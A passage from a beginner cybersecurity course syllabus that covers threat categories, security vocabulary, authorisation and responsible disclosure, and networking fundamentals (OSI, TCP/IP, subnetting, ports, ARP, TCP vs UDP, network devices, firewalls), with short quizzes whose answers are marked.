The source material treats this topic as only a brief category name-check — 'viruses, malware, phishing, ransomware, etc.' — before the programme dives deep into each threat type in later, dedicated modules (web attacks, network attacks). Internal course-planning notes even mark this exact topic for exclusion from the finalized syllabus, since it overlaps heavily with content covered properly elsewhere. Rather than pad this out with detail the source material doesn't provide, treat it as the map rather than the territory: recognize the category names here, then learn to detect, exploit, or defend against each one in the modules built specifically for them.

**Key Points:**

- Malware: malicious software designed to damage or gain unauthorized access to a system (viruses, worms, trojans, spyware)
- Phishing: deceptive messages that trick users into revealing credentials or installing malware
- Ransomware: encrypts victim data and demands payment for the decryption key
- The Bridge Course syllabus introduces these only as a category list at this stage ('viruses, malware, phishing, ransomware, etc.') — it is explicitly a high-level overview, not a technical deep dive
- Internal course-planning notes flag this exact topic as a candidate for exclusion from the finalized course outline, since MITM/ARP spoofing and DDoS get their proper treatment in the dedicated network and web-attack modules later in the programme
- This topic is intentionally a preview: the goal here is recognizing the threat names before learning to detect, exploit, or defend against each one in depth

**Resources:**

- [MITRE ATT&CK](https://attack.mitre.org) _(link)_
- [CISA](https://www.cisa.gov) _(link)_
- [Professor Messer Security+ videos](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. Which attack type specifically encrypts victim data and demands payment for the decryption key?
   - **Ransomware** ✓
   - Phishing
   - DDoS
   - MITM
   > Ransomware is malware that encrypts a victim's files and demands payment, usually in cryptocurrency, for the decryption key.
2. ARP spoofing is a technique commonly used to carry out which attack type?
   - **MITM (Man-in-the-Middle)** ✓
   - DDoS
   - Ransomware
   - Phishing
   > ARP spoofing lets an attacker position themselves between two hosts on a LAN, enabling interception/modification of traffic - a classic MITM technique.
3. Which attack overwhelms a service with traffic from many sources to make it unavailable?
   - **DDoS** ✓
   - Phishing
   - Ransomware
   - MITM
   > DDoS (Distributed Denial of Service) floods a target with traffic from many sources so legitimate users cannot get through.

#### 10. Key Terms: CVE, CWE, IOC, APT, Zero-Day, Threat Actor, TTP `[theory]` — Week 1

Core vocabulary that recurs constantly in vulnerability reports, threat intel feeds, and pentest write-ups. The source material's 'Basic Terminology' section for this module specifically calls out vulnerabilities, exploits, firewalls, encryption, zero-day, and patch as the starting vocabulary, alongside an introduction to common frameworks (NIST, ISO/IEC 27001) that give structure to how organizations talk about and manage security. Internal course notes separately flag CVE and CWE as terms this module still needed to define — get these definitions locked in early since they recur everywhere afterward.

**Key Points:**

- Vulnerability: a weakness in a system that could be exploited — the foundational concept the rest of this vocabulary builds on
- Exploit: code or a technique that takes advantage of a vulnerability to actually do something unintended
- Patch: the fix a vendor releases to close a vulnerability — the reason 'keep systems patched' is a recurring theme in security
- Zero-day: named explicitly in the source's basic terminology list — a vulnerability that is unknown to the vendor (or still unpatched) while it's being used
- Firewall and encryption: named alongside the above as foundational terms — a firewall controls what traffic is allowed through, encryption protects data confidentiality
- CVE and CWE: flagged directly in internal course notes as terms this module needed to cover — CVE identifies a specific known vulnerability, CWE identifies the class or root-cause weakness behind it
- Frameworks: NIST and ISO/IEC 27001 are introduced in this same section as the common reference frameworks organizations use to structure their security programs
- IOC, APT, Threat Actor, TTP: round out the vocabulary for describing evidence of compromise, long-term sophisticated campaigns, who's behind an attack, and how they operate

**Resources:**

- [cve.mitre.org](https://cve.mitre.org) _(link)_
- [CWE (cwe.mitre.org)](https://cwe.mitre.org) _(link)_
- [MITRE ATT&CK](https://attack.mitre.org) _(link)_

**Quick Quiz:**

1. What does a CVE identifier uniquely refer to?
   - **A specific, publicly known vulnerability** ✓
   - A general class/root cause of weakness
   - A confirmed breach in progress
   - A named threat actor group
   > CVE (Common Vulnerabilities and Exposures) assigns a unique public ID to one specific known vulnerability, e.g. CVE-2021-44228 for Log4Shell.
2. CWE-79 is the root-cause weakness class behind which vulnerability type?
   - **Cross-Site Scripting (XSS)** ✓
   - SQL Injection
   - Buffer Overflow
   - SSRF
   > CWE-79 (Improper Neutralization of Input During Web Page Generation) is the CWE describing the root cause behind all XSS vulnerabilities.
3. What best describes a zero-day vulnerability?
   - **A vulnerability unknown to the vendor with no patch available** ✓
   - Any vulnerability discovered within the last 24 hours
   - A vulnerability that has already been fully patched
   - A vulnerability only found in outdated software
   > A zero-day is a flaw the vendor does not yet know about (or hasn't patched), meaning there has been zero days to prepare a fix.

#### 11. Ethical & Legal Boundaries in Security (authorisation, responsible disclosure) `[theory]` — Week 1

The source material for this module doesn't include a dedicated legal/ethical-boundaries section — the closest hook is the offensive security framing used earlier in the same unit: an engagement means someone is hired to try to break a system ('hire someone to try to break the vending machine'), and mitigations get built from whatever they find. That hired, permission-based arrangement is exactly the authorization model this topic is built on. Treat this as the one absolute rule tying together everything else in the course: anything practiced in this programme must be against a system you own or have explicit permission to test.

**Key Points:**

- The authorization model traces directly to this unit's own offensive-security framing: an engagement means someone is hired, with permission, to try to break a system, and mitigations get built afterward — never testing without that arrangement
- Always obtain written authorization before testing any system you don't own (Rules of Engagement)
- Practice exclusively on lab environments: TryHackMe, HackTheBox, PortSwigger Academy, DVWA, VulnMachines
- Responsible disclosure: report vulnerabilities to the vendor/owner before any public disclosure
- Unauthorized access carries legal consequences in most jurisdictions regardless of intent — the source material doesn't detail specific statutes, so 'get permission first' is the operating rule, not any one particular law

**Resources:**

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) _(link)_
- [HackerOne Disclosure Guidelines](https://www.hackerone.com/disclosure-guidelines) _(link)_
- [TryHackMe](https://tryhackme.com) _(platform)_

**Quick Quiz:**

1. What must you obtain before testing any system you do not own?
   - **Written authorisation (Rules of Engagement)** ✓
   - A verbal promise from a friend who works there
   - Nothing, if your intent is good
   - A VPN connection to the target
   > Written authorisation and defined Rules of Engagement are required before testing any system you don't own, regardless of good intentions.
2. What does 'responsible disclosure' mean in the context of finding a vulnerability?
   - **Reporting the vulnerability to the vendor/owner before any public disclosure** ✓
   - Publishing the exploit on social media immediately for credit
   - Selling the vulnerability to the highest bidder
   - Ignoring it since it is not your job to report it
   > Responsible disclosure means giving the vendor/owner a chance to fix the issue before any public release of details.
3. Why is unauthorised access illegal in most jurisdictions even if the tester had good intentions?
   - **Laws like the Computer Misuse Act or CFAA criminalise unauthorised access regardless of intent** ✓
   - Intent is always a full legal defence
   - Only causing financial damage is illegal
   - These laws only apply to nation-state actors
   > Laws such as the UK Computer Misuse Act and the US CFAA criminalise unauthorised access to computer systems irrespective of the tester's motive.


---

## M2: Networking

**Month 1** · Week 2 · 13 topics

How devices actually talk to each other — from the 7-layer OSI reference model down to the exact packets a firewall inspects. This is the single most load-bearing module for everything that follows: recon, scanning, sniffing, and web attacks all sit on top of this foundation.

**Learning Outcomes:**

- Explain the OSI and TCP/IP models and map real protocols to each layer
- Read and calculate IPv4 subnets and CIDR notation
- Identify common ports/protocols and the purpose of MAC/ARP
- Differentiate TCP and UDP and when each is used
- Explain what a firewall, VPN, proxy, and NAT actually do to traffic
- Capture and interpret live traffic in Wireshark

**Module Resources:**

- [TryHackMe Networking Fundamentals](https://tryhackme.com) _(platform)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_
- [Wireshark](https://www.wireshark.org) _(tool)_

**Module Quiz (10 questions):**

1. Which model do real-world networks actually run on, versus the theoretical 7-layer reference model?
   - **TCP/IP (4 layers)** ✓
   - OSI (7 layers) exclusively
   - Both are used identically in practice with no distinction
   - Neither model reflects real traffic
   > TCP/IP is the practical engine real networks run on, while OSI serves mainly as a theoretical reference/vocabulary model.
2. A /24 network provides how many usable host addresses?
   - **254** ✓
   - 256
   - 128
   - 62
   > A /24 has 256 total addresses, minus the network and broadcast addresses, leaving 254 usable.
3. Which port/protocol pairing is correct?
   - **HTTPS uses port 443 with TLS encryption** ✓
   - SSH uses port 21
   - DNS uses port 80
   - RDP uses port 22
   > HTTPS runs on port 443 over TLS; SSH is 22, FTP is 21, and RDP is 3389, not the values in the distractor options.
4. What does ARP spoofing exploit to enable a Man-in-the-Middle attack?
   - **Trusting unauthenticated ARP replies that map an IP address to a MAC address** ✓
   - A weakness in the TCP 3-way handshake
   - A flaw in DNS TTL values
   - A misconfigured NAT gateway
   > ARP has no built-in authentication, so an attacker can send forged replies mapping their MAC to a victim's IP, enabling interception.
5. Which transport protocol would a live video call typically use, and why?
   - **UDP, because it favours speed over guaranteed delivery** ✓
   - TCP, because ordered delivery matters more than speed
   - ICMP, because it is the fastest transport protocol
   - ARP, because it operates at Layer 4
   > Real-time services like video calls favour UDP's speed over TCP's delivery guarantees, tolerating occasional dropped packets.
6. Which device operates at Layer 3 and can enforce ACLs between different networks?
   - **Router** ✓
   - Hub
   - Unmanaged switch
   - Repeater
   > Routers forward traffic between networks based on IP and can enforce access control lists, unlike Layer 1/2 devices.
7. What is the main advantage of a stateful firewall over a simple packet filter?
   - **It tracks ongoing connection state/context rather than evaluating each packet in isolation** ✓
   - It cannot inspect TCP traffic at all
   - It is always slower with no added benefit
   - It operates only at Layer 1
   > Stateful inspection understands the context of an ongoing connection, giving more accurate filtering than a stateless packet filter.
8. Why does an organisation deploy NAT even though it complicates inbound connections?
   - **To conserve scarce public IPv4 addresses by sharing one public IP across many internal devices** ✓
   - To speed up DNS resolution
   - To provide encryption for internal traffic
   - To eliminate the need for a firewall
   > NAT's core purpose is address conservation, sharing one public IP among many internal hosts, at the cost of needing port forwarding for inbound access.
9. When you type a URL and hit Enter, what must occur before the TCP handshake can begin?
   - **DNS resolution of the domain to an IP address** ✓
   - The TLS handshake
   - The HTTP response rendering
   - An ARP broadcast to the destination server across the internet
   > The browser must first resolve the domain name to an IP address via DNS before it can open a TCP connection to that IP.
10. In Wireshark, which view gives an overall breakdown of captured protocols during a capture-and-label exercise?
   - **Statistics -> Protocol Hierarchy** ✓
   - Follow -> TCP Stream only
   - Capture Options
   - Preferences -> Appearance
   > Statistics -> Protocol Hierarchy summarises the proportion of each protocol present in a capture, ideal for an OSI-layer labelling exercise.

### Topics

#### 12. OSI Model — All 7 Layers Explained `[theory]` — Week 2

The OSI (Open Systems Interconnection) model is a 7-layer conceptual framework — the source material's own analogy is a letter going through the postal system: you write the message (Application), put it in an envelope (Presentation), it gets a tracking number (Session), gets split into multiple packages if too big (Transport), the postal service picks the fastest route (Network), the postman confirms the exact house (Data Link), and finally walks over and delivers it (Physical). It's largely a teaching model — 'TCP/IP is the actual engine, OSI is the blueprint/manual' — but the vocabulary is unavoidable in security work: Wireshark captures operate at Layer 2/3, a WAF defends at Layer 7, and describing an attack by its layer is standard practice.

**Key Points:**

- L7 Application: the interface between user apps (browsers, email clients) and the network — handles DNS, HTTP/HTTPS, FTP, SMTP, IMAP/POP3; concerned with *what* data is communicated, not how it's transported
- L6 Presentation: the 'translator' between Session and Application — formats data, encrypts/decrypts it, and compresses/decompresses it so the receiving application can actually read it
- L5 Session: the 'conversation manager' — opens a session, keeps it alive for the duration of the exchange (e.g. a video call), and closes it when done
- L4 Transport: the 'delivery service' — breaks data into segments, tracks them, retransmits anything lost, and provides flow control; TCP and UDP live here
- L3 Network: the 'navigation system' — like GPS for packets, it decides the best route across networks using IP addressing
- L2 Data Link: node-to-node delivery within one physical segment, split into LLC (flow/error control) and MAC (medium access + MAC addressing) sublayers; Ethernet, PPP, and HDLC operate here
- L1 Physical: raw bits over cable, fiber, or radio — the actual NICs, hubs, connectors, and signal encoding
- In the real world, TCP/IP's 4 layers is what actually runs the internet — OSI is the 7-layer study model used to reason about it
- Security tools map cleanly to layers: Wireshark operates at L2/L3, firewalls at L3/L4, a WAF at L7

**Resources:**

- [Professor Messer: OSI Model](https://www.professormesser.com) _(video)_
- [Cloudflare: What is the OSI Model?](https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-osi-model/) _(link)_
- [TryHackMe Networking Fundamentals](https://tryhackme.com) _(platform)_

**Quick Quiz:**

1. Which OSI layer do MAC addresses and switches operate at?
   - **Layer 2 (Data Link)** ✓
   - Layer 3 (Network)
   - Layer 7 (Application)
   - Layer 1 (Physical)
   > MAC addresses and switch forwarding decisions operate at Layer 2, the Data Link layer.
2. At which OSI layer does a Web Application Firewall (WAF) primarily defend?
   - **Layer 7 (Application)** ✓
   - Layer 2 (Data Link)
   - Layer 4 (Transport)
   - Layer 1 (Physical)
   > A WAF inspects application-level content like HTTP requests, placing its defence at Layer 7.
3. Which statement best captures the OSI vs TCP/IP relationship as taught in this topic?
   - **TCP/IP is the actual engine networks run on; OSI is a theoretical blueprint/reference model** ✓
   - OSI is what real networks run on; TCP/IP is purely theoretical
   - Both models have exactly the same number of layers
   - OSI has 4 layers and TCP/IP has 7
   > The topic explicitly frames TCP/IP as the real-world engine while OSI serves as the conceptual blueprint used for vocabulary and reference.

#### 13. TCP/IP Model `[theory]` — Week 2

TCP/IP is the 4-layer model that actually runs every network you'll ever test — unlike the 7-layer OSI model, which is mainly a teaching framework. TCP breaks data into packets and adds headers for addressing and sequencing, hands them to IP, which wraps them with its own header (source/destination IP) and routes them across the network; the receiving TCP stack reassembles the packets into the original stream.

**Key Points:**

- Layers: Application (HTTP/FTP/SMTP) → Transport (TCP/UDP) → Internet (IP/ICMP) → Network Access (Ethernet/Wi-Fi)
- TCP breaks data into packets and adds addressing/sequencing headers; IP wraps those packets with its own header (source + destination IP) and routes them; the destination reassembles them into the original data
- TCP = reliable, ordered, error-checked delivery; IP = addressing and routing of packets
- Key features: scalability (runs the whole internet), interoperability (vendor-independent), routability (via OSPF, BGP), modularity (each layer's protocols work independently)
- 'TCP/IP is the actual engine inside the car (used to drive); OSI is the blueprint/manual of how the engine works (used to study)' — in the real world we use TCP/IP, not OSI

**Resources:**

- [Cloudflare: What is TCP/IP?](https://www.cloudflare.com/learning/ddos/glossary/tcp-ip/) _(link)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_
- [RFC 1180: A TCP/IP Tutorial](https://www.rfc-editor.org/rfc/rfc1180) _(link)_

**Quick Quiz:**

1. How many layers does the TCP/IP model have, compared to OSI's seven?
   - **4** ✓
   - 7
   - 5
   - 3
   > TCP/IP condenses networking into 4 layers: Application, Transport, Internet, and Network Access, versus OSI's 7.
2. Which protocol operates at the TCP/IP model's Internet layer?
   - **IP** ✓
   - HTTP
   - FTP
   - Ethernet
   > IP (along with ICMP) operates at the Internet layer, handling addressing and routing of packets.
3. Which pairing correctly matches a TCP/IP feature to its description?
   - **TCP provides reliable, ordered, error-checked delivery while IP handles addressing and routing** ✓
   - TCP handles addressing while IP guarantees delivery order
   - Both TCP and IP operate only at the Application layer
   - IP is connection-oriented while TCP is connectionless
   > TCP focuses on reliable, ordered delivery of data, while IP is responsible for addressing and routing packets to their destination.

#### 14. IP Addressing (IPv4, IPv6) & Subnetting `[theory]` — Week 2

Every device needs an address to send and receive data — IPv4 is a 32-bit address (e.g. 192.168.1.1, ~4.3 billion possible addresses) while IPv6 is a 128-bit hex address (e.g. 2001:0db8:85a3:0000:0000:8a2e:0370:7334) built to solve IPv4 exhaustion. Subnetting then divides one address block into smaller, isolated sub-networks — like sectioning a warehouse into labeled zones instead of one giant shared space — using CIDR notation (e.g. /24, /26) to define how many bits are network vs host.

**Key Points:**

- IPv4: 32-bit address (e.g. 192.168.1.1), ~4.3 billion total addresses; IPv6: 128-bit hex address (e.g. 2001:0db8:85a3:0000:0000:8a2e:0370:7334) designed to solve IPv4 exhaustion
- Public IP = your street address (unique, ISP-assigned, visible to the whole internet); Private IP = room numbers inside the house (only your local network knows them) — the router translates between the two via NAT
- Static IP: manually assigned, never changes — used for servers/printers needing a fixed address; Dynamic IP: auto-assigned by a DHCP server, can change periodically — used for most consumer devices
- CIDR /24 = 255.255.255.0 = 256 addresses, 254 usable (network + broadcast reserved)
- Worked example from the module: 192.168.1.0/24 subnetted to /26 (26 network bits, 6 host bits) creates 4 subnets of 64 addresses each: 192.168.1.0/26 (hosts .1–.62), .64/26 (.65–.126), .128/26 (.129–.190), .192/26 (.193–.254)
- Subnetting isolates traffic, reduces broadcast domains, and enables per-segment security policy
- Traditional Class A/B/C addressing set default subnet masks; CIDR notation now lets any network/host split be defined with a /n suffix

**Resources:**

- [subnettingpractice.com](https://subnettingpractice.com) _(tool)_
- [Professor Messer: Subnetting](https://www.professormesser.com) _(video)_
- [Cloudflare: What is an IP Address?](https://www.cloudflare.com/learning/dns/glossary/what-is-my-ip-address/) _(link)_

**Quick Quiz:**

1. How many usable host addresses does a /24 network typically provide?
   - **254** ✓
   - 256
   - 255
   - 252
   > A /24 has 256 total addresses, minus the network and broadcast addresses, leaving 254 usable hosts.
2. What does CIDR notation like /24 define?
   - **How many bits of the address are the network portion vs the host portion** ✓
   - The exact MAC address of the gateway
   - The physical cable length allowed
   - The DNS server to use
   > CIDR notation specifies the prefix length, i.e. how many leading bits identify the network versus the remaining host bits.
3. Why was IPv6 introduced alongside IPv4?
   - **To solve IPv4 address exhaustion with its much larger 128-bit address space** ✓
   - To replace TCP with a faster transport protocol
   - To eliminate the need for subnetting entirely
   - To provide backward compatibility with MAC addresses
   > IPv6's 128-bit address space vastly exceeds IPv4's 32-bit space, solving the exhaustion of available IPv4 addresses.

#### 15. Ports & Common Protocols (DNS, HTTP/S, FTP, SSH, SMTP, RDP) `[theory]` — Week 2

Ports are the numbered 'doors' on a device that identify which service is being talked to — an IP address plus a port number forms a socket, the unique identifier that makes data transmission possible. The source module groups network protocols into four functional families — communication, security, network management, and transport layer — and walks through a concrete real-world example for each: HTTP/HTTPS fetching a web page, FTP uploading site files, SMTP/IMAP/POP3 moving mail, SSH/SNMP/ICMP managing devices, and TCP/UDP moving the actual bytes. Every service you'll ever scan or exploit is first identified by its port and protocol: door 80 for general HTTP access, door 443 for encrypted HTTPS access, door 21 for FTP file storage, door 25 for the SMTP 'mailroom.'

**Key Points:**

- A port + IP address = a socket, the unique identifier that enables data transmission between two specific services
- Building-with-numbered-doors analogy from the module: door 80 (HTTP, general access), door 443 (HTTPS, same access but secured), door 21 (FTP, a dedicated file storage room), door 25 (SMTP, the company mailroom for sending/receiving mail)
- DNS (53): resolves a human-readable domain into an IP (e.g. www.example.com → 172.217.12.196) — the 'phone book' of the internet
- FTP (21), SSH (22, encrypts remote commands/data for server administration), SMTP (25, mail sending), RDP (3389, Windows remote desktop)
- IMAP vs POP3: IMAP synchronizes email across every device (marking a message read on one device reflects everywhere); POP3 downloads mail to one device and, by default, deletes it from the server — no sync
- Security/management protocols: SSL/TLS and IPSec secure data in transit; SNMP monitors network devices; ICMP carries error/status messages and is what the ping command actually uses
- TCP-based services carry things that must be accurate (web pages, email, downloads); UDP-based services (DNS queries, live streaming) trade guaranteed delivery for speed
- Communication protocols move data between devices with a real example each: a browser sends an HTTP request to fetch a page; HTTPS adds SSL/TLS encryption, which is why online banking and e-commerce sites use it for transactions; FTP is how web developers upload website files to a server; SMTP ensures a sent email reaches the recipient's mail server
- The module's own four-way protocol split: Communication protocols (HTTP, HTTPS, DNS, FTP, SMTP, IMAP/POP3), Security protocols (SSL/TLS, IPSec, SSH), Network Management protocols (SNMP, ARP, ICMP), and Transport Layer protocols (TCP, UDP)

```bash
ping google.com
curl -I https://example.com
```

**Resources:**

- [IANA Service Name and Port Number Registry](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) _(link)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. Which port is associated with encrypted web traffic (HTTPS)?
   - **443** ✓
   - 80
   - 21
   - 25
   > Port 443 is the standard port for HTTPS, which wraps HTTP traffic in TLS encryption.
2. Which protocol resolves domain names to IP addresses, typically over port 53?
   - **DNS** ✓
   - FTP
   - SMTP
   - RDP
   > DNS is the 'phone book' of the internet, translating domain names to IP addresses, usually over port 53.
3. Which of these is described as a UDP-based service favouring speed over reliability?
   - **DNS queries** ✓
   - FTP file transfer
   - SSH remote administration
   - HTTP over TCP
   > The topic notes DNS queries and streaming as UDP-based traffic that favours speed over guaranteed delivery.

#### 16. MAC Address & ARP `[theory]` — Week 2

A MAC address is a 12-digit hex identifier burned into a device's NIC by its manufacturer (e.g. 00:1A:2B:3C:4D:5E — the first 6 characters are the OUI identifying the manufacturer, the last 6 uniquely identify the device). ARP is how a device turns a known IP into the MAC address it actually needs to deliver a frame on the local segment — like asking around a neighborhood 'who has this phone number?' until the owner replies with their exact house number. The module's own version of that analogy: you want to send John a message but only know his phone number (his IP address), not his house address (his MAC address) — you ask around ('Who has this phone number?' — an ARP Request, broadcast to everyone), John replies ('That's my number, and my address is 12A!' — an ARP Reply, sent back by unicast), and now you can deliver directly.

**Key Points:**

- MAC address format: 00:1A:2B:3C:4D:5E — first 6 hex chars (OUI) identify the manufacturer (e.g. Apple, Intel), last 6 uniquely identify that specific device
- ARP process: check ARP cache → if miss, broadcast an ARP Request ('who has this IP?') → the owning device replies via unicast with its MAC → the requester updates its cache
- Simple-terms analogy from the module: you know John's phone number (IP) but not his house address (MAC) — you broadcast 'who has this phone number?', John unicasts back 'that's mine, my address is 12A,' and now you can send him a letter directly
- ARP types: Dynamic (auto-resolved, temporary), Static (manually configured, never expires), Proxy ARP (a router answers on another device's behalf), Gratuitous ARP/GARP (announces or updates a MAC, used to detect IP conflicts)
- ARP Spoofing/Poisoning: an attacker sends forged ARP replies mapping their own MAC to a legitimate IP, enabling Man-in-the-Middle traffic interception
- Finding your own MAC: Windows → `ipconfig /all` (look for 'Physical Address'); macOS → System Preferences > Network > Advanced > Hardware; Linux → `ifconfig` or `ip a` (look for HWaddr/ether)
- MAC filtering restricts network access to an approved allow-list of MAC addresses, but it isn't foolproof — an attacker can simply spoof an allowed MAC
- MAC addresses operate only within a local network segment (Layer 2); routers use IP for anything beyond it; the ARP cache is periodically refreshed to keep IP-to-MAC mappings accurate

```bash
arp -a
arp -n
ipconfig /all
ifconfig
```

**Resources:**

- [Cloudflare: What is ARP?](https://www.cloudflare.com/learning/ddos/glossary/address-resolution-protocol-arp/) _(link)_
- [Wireshark](https://www.wireshark.org) _(tool)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. What is the correct order of the ARP resolution process?
   - **Check ARP cache -> broadcast ARP Request -> receive unicast ARP Reply -> update cache** ✓
   - Broadcast ARP Reply -> check cache -> unicast Request
   - Update cache -> broadcast Request -> check cache
   - Send unicast Request -> broadcast Reply -> check cache
   > A host first checks its local ARP cache, and only if the mapping is missing does it broadcast a Request and wait for a unicast Reply to update the cache.
2. What does ARP spoofing/poisoning let an attacker do?
   - **Map their own MAC address to a legitimate IP to intercept traffic (enabling MITM)** ✓
   - Permanently change a target's public IP address
   - Bypass TLS certificate validation on any site
   - Disable DNS resolution across the entire internet
   > ARP spoofing tricks other hosts on the LAN into associating a legitimate IP with the attacker's MAC address, enabling man-in-the-middle interception.
3. Why can't a MAC address alone be used to route traffic across the internet?
   - **MAC addresses only operate within a local network segment; routers use IP beyond it** ✓
   - MAC addresses are globally routable like IP addresses
   - Routers only understand MAC addresses, not IP
   - MAC addresses change on every packet sent
   > MAC addresses are Layer 2 identifiers valid only on the local segment; routers rely on IP addresses to forward traffic between networks.

#### 17. TCP vs UDP — Differences & Use Cases `[theory]` — Week 2

TCP and UDP are the two transport-layer protocols, and they trade reliability for speed in opposite directions. TCP opens a connection with a 3-way handshake (SYN → SYN-ACK → ACK, like introducing yourself, getting a reply, and confirming), numbers every segment so it can detect loss and retransmit, and closes the connection with an explicit 4-way goodbye (FIN → ACK → FIN → ACK). UDP skips all of that — it just fires off independent 'datagrams' with no handshake, no sequence numbers, and no retransmission, which is exactly why DNS, DHCP, VoIP, and game traffic use it. The module's own framing puts it plainly: TCP is connection-oriented and guarantees packets arrive in order and without errors — its stated use cases are streaming video, downloading files, and sending email; UDP is connectionless, faster, but makes no delivery or order guarantee — its stated use cases are online gaming, video calls, and live streaming.

**Key Points:**

- TCP 3-way handshake: SYN → SYN-ACK → ACK establishes the connection before any data flows (like 'Hello?' / 'Hi, can I help you?' / 'Yes, I'd like to talk!')
- TCP 4-way termination: FIN → ACK → FIN → ACK — both sides explicitly confirm the connection is closing, like both parties saying goodbye
- TCP numbers every segment and uses ACKs to confirm receipt, retransmitting anything lost or damaged so data reassembles in the original order
- TCP flow/congestion control: a sliding window regulates transmission speed between sender and receiver; congestion algorithms (TCP Reno, TCP Cubic) throttle the rate back when the network is overloaded
- UDP sends independent datagrams — the header carries only source/destination port, no sequence numbers, no handshake, and lost packets are never resent
- UDP use cases: streaming media, online gaming, and specifically DNS queries and DHCP, where a fast response matters more than perfect reliability
- The module's own connection-oriented vs connectionless split: TCP is described as connection-oriented, guaranteeing all packets arrive in order and without errors, with example traffic of streaming video, file downloads, and email; UDP is described as connectionless, prioritizing speed over reliability, with example traffic of online gaming, video calls, and live streaming
- Nmap treats TCP and UDP scans very differently (-sS vs -sU) — UDP scanning is much slower

**Resources:**

- [Cloudflare: What is UDP?](https://www.cloudflare.com/learning/ddos/glossary/user-datagram-protocol-udp/) _(link)_
- [Nmap official docs](https://nmap.org/book/man.html) _(link)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. Which protocol establishes a connection via a 3-way handshake before sending data?
   - **TCP** ✓
   - UDP
   - ARP
   - ICMP
   > TCP is connection-oriented and uses a SYN, SYN-ACK, ACK handshake to establish a reliable connection before data transfer.
2. Why is UDP preferred for services like live video calls and DNS queries?
   - **It is connectionless and faster, without waiting for delivery guarantees** ✓
   - It guarantees in-order, reliable delivery like TCP
   - It encrypts data by default
   - It performs a 3-way handshake for reliability
   > UDP skips connection setup and delivery guarantees, trading reliability for the speed needed by real-time services.
3. How does Nmap's approach differ between TCP and UDP scanning?
   - **UDP scanning (-sU) is typically much slower than TCP SYN scanning (-sS)** ✓
   - TCP and UDP scans in Nmap run at identical speed
   - UDP scanning is always faster than TCP scanning
   - Nmap cannot scan UDP ports at all
   > Because UDP has no handshake and often requires waiting on timeouts or ICMP responses, UDP scans (-sU) are much slower than TCP SYN scans (-sS).

#### 18. Switches, Routers, Hubs - Differences `[theory]` — Week 2

Hub, switch, and router form an intelligence ladder at Layers 1 through 3. A hub is a dumb multiport repeater — the module compares it to a basic multi-socket electrical connector, or a group chat where everyone gets every message even if it's meant for just one person — that blasts every incoming signal out to every port regardless of who needs it. A switch learns which device sits on which port and forwards frames only to that MAC address, like a receptionist directing calls to the correct person instead of making the whole office listen to every call. A router connects entire separate networks (like a home LAN to the internet) and picks the best path for packets using IP addressing, typically layering in Wi-Fi and firewall features too — the module calls routers 'internet traffic guides' that lead information in and out of a network as efficiently as possible. The module's own comparison table adds hard numbers: hub and switch both top out in the 10Mbps–100Mbps range, while a router runs 1–100Mbps wired (1–10Mbps wireless); a hub or switch only needs one network to function, but a router needs at least two, because its entire job is connecting separate networks together.

**Key Points:**

- Hub (L1): broadcasts every frame to every connected port with zero awareness of the recipient — 'a group chat where everyone gets every message'; types: Active, Passive, Intelligent
- Multi-socket-electrical-connector analogy from the module: a hub just links devices together with no idea where the data should go, so it sends everything to everyone even if only one device needs it
- Switch (L2): learns the MAC address on each port and forwards frames only to the intended device — 'a receptionist directing calls to the right person'; types: Unmanaged, Managed, Layer 2, Layer 3 (can also route)
- Router (L3): connects distinct networks and finds the best path using IP addresses; often bundles Wi-Fi and basic firewall capability; types: Wired, Wireless, Core, Edge
- Security rises with intelligence: hub = low, switch = moderate, router = high (ACLs, firewall features)
- Speed/cost scale accordingly: hub is cheapest but slowest and least secure; router is the most expensive but supports LAN/MAN/WAN-scale networks
- From the module's comparison table: hub and switch both operate in the 10Mbps–100Mbps range, while a router runs 1–100Mbps wired or 1–10Mbps wireless; a hub or switch each need only one network to do their job, while a router needs at least two networks — because connecting separate networks is the whole point of a router
- Use-case scale: hub for tiny/legacy setups, switch for office and business LANs, router for connecting networks to each other (home-to-internet, office-to-office)

**Resources:**

- [Cisco Networking Basics](https://www.cisco.com/c/en/us/solutions/small-business/resource-center/networking/networking-basics.html) _(link)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. Which device forwards traffic based on the destination MAC address (Layer 2)?
   - **Switch** ✓
   - Hub
   - Router
   - Firewall
   > A switch builds a MAC address table and forwards frames only to the port associated with the destination MAC, unlike a hub.
2. Which device is the 'dumbest' of the three, broadcasting to every port with no intelligence?
   - **Hub** ✓
   - Switch
   - Router
   - Layer 3 switch
   > A hub has no addressing intelligence and simply repeats incoming signals out every other port, which is why it is largely obsolete.
3. Which device routes packets between different networks based on IP address and supports ACLs?
   - **Router** ✓
   - Hub
   - Unmanaged switch
   - Repeater
   > A router operates at Layer 3, forwarding packets between distinct networks using IP addresses and enforcing access control lists.

#### 19. Firewall Basics (packet filter, stateful, NGFW) `[theory]` — Week 2

A firewall inspects every packet crossing a boundary and allows or blocks it against a rule set. The module's own analogy: imagine your house has a gate — friends and family (safe traffic) can enter, while strangers or thieves (malicious traffic) are blocked; a firewall is that security guard, deciding what data can enter or leave based on safety rules. The source material walks through five firewall types of increasing sophistication, from basic packet filtering up to cloud-hosted NGFWs, plus the built-in features (IDPS, web filtering, VPN support, anti-malware, logging) that make a modern firewall more than a simple gatekeeper, and frames the whole point of a firewall around four concrete threat categories: unauthorized access, malware and virus attacks, data breaches, and denial-of-service.

**Key Points:**

- Packet-Filtering Firewall: inspects only IP address, port, and protocol — not the actual content — simplest and least effective against advanced threats
- Stateful Inspection Firewall: tracks a session table of active connections and only allows traffic that matches a legitimate, ongoing session
- Proxy/Application-Layer Firewall: sits as an intermediary so internal and external systems never connect directly, inspecting Layer 7 traffic and masking internal IPs
- NGFW: layers deep packet inspection, intrusion prevention, and malware detection together, often ML-assisted, built to handle encrypted/HTTPS-heavy modern traffic
- Cloud-Based Firewall: hosted firewall protecting cloud apps and remote users, scaling elastically with real-time threat intel
